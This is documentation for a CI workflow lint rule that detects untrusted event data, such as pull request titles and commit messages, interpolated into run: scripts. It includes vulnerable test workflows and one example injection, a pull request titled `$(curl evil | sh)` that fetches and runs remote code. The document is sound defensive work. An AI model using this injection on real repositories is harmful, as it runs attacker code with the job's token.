# CI007 no-event-interpolation-in-run

An attacker-influenced expression spliced into a `run:` script.

## What it does

Scans each `run:` text for `${{ ... }}` expressions. A context from the narrow set (issue and pull request titles and bodies, head ref and label, comment and review bodies, commit messages and author names, `github.head_ref`, plus the configured `contexts`) is an Error; any other `github.event.*` or `inputs.*` value that is not a number or hash is an Advisory. The scan is lexical: it does not parse the shell.

## Why it matters

The expression is expanded before the shell runs, so a pull request titled `$(curl evil | sh)` runs as code with the job's token.

## Remedy

Pass the value through `env:` and read it as a quoted shell variable.

## Examples

### Fires case 1

```yaml expect=fire file=.github/workflows/ci.yml
name: ci
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
```

### Fires case 2

```yaml expect=fire file=.github/workflows/ci.yml
name: ci
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ github.event.commits[0].message }}
```

### Fires case 3

```yaml expect=fire file=.github/workflows/ci.yml
name: ci
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ github.event.client_payload.note }}
```

### Fires case 4

```yaml expect=fire file=.github/workflows/ci.yml config="context=github.event.client_payload.note"
name: ci
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ github.event.client_payload.note }}
```

### Clean case 5

```yaml expect=clean file=.github/workflows/ci.yml
name: ci
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.pull_request.title }}
```

### Clean case 6

```yaml expect=clean file=.github/workflows/ci.yml
name: ci
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ github.event.pull_request.number }} ${{ github.sha }}
```

### Clean case 7

```yaml expect=clean file=.github/workflows/ci.yml
name: ci
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
```
